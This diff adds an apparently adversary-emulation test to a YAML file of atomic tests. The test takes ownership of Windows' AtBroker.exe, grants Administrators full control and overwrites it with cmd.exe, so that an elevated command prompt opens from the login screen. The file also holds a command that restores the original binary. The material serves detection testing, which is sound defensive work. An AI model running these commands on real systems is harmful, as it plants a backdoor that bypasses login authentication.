@@ -185,3 +185,18 @@ atomic_tests:
       copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
     name: command_prompt
     elevation_required: true
+- name: Replace AtBroker.exe (App Switcher binary) with cmd.exe
+  description: |
+    Replace AtBroker.exe (App Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt from the login screen by locking and then unlocking the computer after toggling on any of the accessibility tools in the Accessibility menu.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd )
+      takeown /F C:\Windows\System32\AtBroker.exe /A
+      icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t
+      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
+    cleanup_command: |
+      copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
+    name: command_prompt
+    elevation_required: true
